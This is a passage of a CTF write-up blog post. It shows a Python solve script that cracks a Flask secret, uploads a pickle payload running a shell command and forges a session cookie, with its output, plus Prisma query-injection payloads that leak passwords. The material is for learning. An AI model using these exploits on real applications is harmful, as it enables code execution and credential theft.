</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> ThreadPool(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> res <span style="color:#f92672">in</span> p<span style="color:#f92672">.</span>map(unsign, product(<span style="color:#e6db74">&#39;0123456789abcdef&#39;</span>, repeat<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> res:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Actual server secret:&#39;</span>, real_secret <span style="color:#f92672">:=</span> res[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">SID:&#39;</span>, (sid <span style="color:#f92672">:=</span> res[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> isinstance(sid, bytes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># send poisoned payload</span>
</span></span><span style="display:flex;"><span>    poison <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;gASVPAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCQvcmVhZGZsYWcgPiAvYXBwL2FwcC9zdGF0aWMvZmxhZy50eHSUhZRSlC4=&#39;</span>
</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/app/flask_session&#39;</span>
</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;session:&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] Current session cookie:&#39;</span>, signed_sid)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/register&#39;</span>, data<span style="color:#f92672">=</span>dict(username<span style="color:#f92672">=</span>username, password<span style="color:#f92672">=</span>password))
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/login&#39;</span>, data<span style="color:#f92672">=</span>dict(username<span style="color:#f92672">=</span>username, password<span style="color:#f92672">=</span>password))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/status&#39;</span>)<span style="color:#f92672">.</span>json()
</span></span><span style="display:flex;"><span>    timestamp <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>strptime(status[<span style="color:#e6db74">&#39;server_time&#39;</span>], <span style="color:#e6db74">&#34;%Y-%m-</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %H:%M:%S.</span><span style="color:#e6db74">%f</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    timestamp <span style="color:#f92672">=</span> int(timestamp<span style="color:#f92672">.</span>replace(tzinfo<span style="color:#f92672">=</span>datetime<span style="color:#f92672">.</span>timezone<span style="color:#f92672">.</span>utc)<span style="color:#f92672">.</span>timestamp())
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] Estimated timestamp:&#39;</span>, timestamp)
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/profile&#39;</span>, files<span style="color:#f92672">=</span>dict(profile_photo<span style="color:#f92672">=</span>(filename, b64decode(poison))))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>, <span style="color:#e6db74">&#39;Could not upload poisoned payload.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hash_value <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{</span>timestamp<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() 
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] Uploaded file hash should be:&#39;</span>, hash_value)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># stored filename = md5(&#34;session:&#34; + sid)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># cookie = hmac(sid)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we need to find an sid that gives us md5 to the file we just uploaded</span>
</span></span><span style="display:flex;"><span>    cookie <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;_</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{</span>timestamp<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] Payload session ID:&#39;</span>, cookie)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    signer <span style="color:#f92672">=</span> Signer(secret_key<span style="color:#f92672">=</span>real_secret, salt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flask-session&#34;</span>, key_derivation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hmac&#34;</span>)
</span></span><span style="display:flex;"><span>    signed_cookie <span style="color:#f92672">=</span> signer<span style="color:#f92672">.</span>sign(cookie)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] Signed cookie:&#39;</span>, signed_cookie<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(hash_value)
</span></span><span style="display:flex;"><span>    print(hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;session:&#39;</span><span style="color:#f92672">+</span>cookie<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/profile&#39;</span>, cookies<span style="color:#f92672">=</span>dict(session<span style="color:#f92672">=</span>signed_cookie<span style="color:#f92672">.</span>decode()))
</span></span><span style="display:flex;"><span>    print(r, r<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;cookie&#39;</span>])
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] Gratz! payload shouldve ran&#39;</span>)
</span></span></code></pre></div><p>Producing output like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python solve.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logged in
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Grabbing status
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logged in
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Grabbing status
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Grabbing MAC address via path traversal in profile photo
</span></span><span style="display:flex;"><span>02:42:ac:11:00:02
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exfiltrated MAC address: 0242ac110002
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exfiltrated MAC address: 0242ac110002
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Computing server start, seed and UUIDv1 secret...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Computing server start, seed and UUIDv1 secret...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Secret found:
</span></span><span style="display:flex;"><span>        Server uptime: 0:46:33.578068
</span></span><span style="display:flex;"><span>        Server start time: 2025-01-13 00:25:19.411991+00:00
</span></span><span style="display:flex;"><span>        Server seed: <span style="color:#ae81ff">1736727919</span>
</span></span><span style="display:flex;"><span>        Calculated server secret: de95dee3-d144-11ef-85f2-0242ac110002
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cracking server secret <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> bytes<span style="color:#f92672">)</span>...
</span></span><span style="display:flex;"><span>        Actual server secret: de95e275-d144-11ef-85f2-0242ac110002
</span></span><span style="display:flex;"><span>        SID: P3vNiBu1oU3rvUwhFtkLbwuTetURsoLiuNWRwxc28tY
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Current session cookie: P3vNiBu1oU3rvUwhFtkLbwuTetURsoLiuNWRwxc28tY.s1Br6TmVVS1Iep9-3pFsghNPTNg
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Estimated timestamp: <span style="color:#ae81ff">1736730714</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploaded file hash should be: 6d93117395cf4727eac8853fccb7c9d4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Payload session ID: _/app/flask_session_1736730714
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Signed cookie: _/app/flask_session_1736730714.dgXm8Q7cnnlBlzwg6G_lYWHUbAg
</span></span><span style="display:flex;"><span>6d93117395cf4727eac8853fccb7c9d4
</span></span><span style="display:flex;"><span>6d93117395cf4727eac8853fccb7c9d4
</span></span><span style="display:flex;"><span>&lt;Response <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>&gt; session<span style="color:#f92672">=</span>_/app/flask_session_1736730714.dgXm8Q7cnnlBlzwg6G_lYWHUbAg
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Gratz! payload shouldve ran
</span></span></code></pre></div><h1 id="prismatic-blog">Prismatic Blog<a href="#prismatic-blog" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>We know it&rsquo;s a Prisma injection, but how?</p>
<p>The flag is stored in a post with a random ID that does not belong to any user. We have an injection point in name.</p>
<pre tabindex="0"><code>npx prisma generate
npx prisma db push
</code></pre><p>We have two endpoints:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;/api/posts&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">published</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">posts</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">prisma</span>.<span style="color:#a6e22e">post</span>.<span style="color:#a6e22e">findMany</span>({<span style="color:#a6e22e">where</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">query</span>});
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">posts</span>})
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span> });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;/api/login&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> {<span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">password</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">prisma</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">findUnique</span>({<span style="color:#a6e22e">where</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">name</span>
</span></span><span style="display:flex;"><span>                },
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">include</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">posts</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">password</span>) { 
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">posts</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">posts</span>});
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>});
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span>});
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>My teammate <strong>@moha09</strong> solved it using binary search with a payload similar to these:</p>
<pre tabindex="0"><code>/api/posts?author[name]=Bob&amp;AND[0][author][password][lt]=8AXCgMish5Zn59rSXjM
/api/posts?author[name]=White&amp;AND[0][author][password][lt]=3pCtWJfabwPlo6qNgGS1P4
</code></pre><h1 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>It was a great CTF with lots of learning. I could notice growth in my code review skills as auditing lots of code became more natural with less friction.</p>
<p>Generally, I felt less intimidated to jump into open-source dependencies or python&rsquo;s stdlib to get definitive answers on the behaviors of certain constructs.</p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="//localhost:1313/posts/google-ctf-2024-grand-prix-heaven/">
                <span class="button__text">Google CTF 2024 Grand Prix Heaven</span>
                <span class="button__icon">‚Üí</span>
            </a>
        </span>
        
    </div>
</div>

  

  <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "elmosalamy" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>¬© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="//localhost:1313/assets/main.js"></script>
<script src="//localhost:1313/assets/prism.js"></script>







  
</div>

</body>
</html>
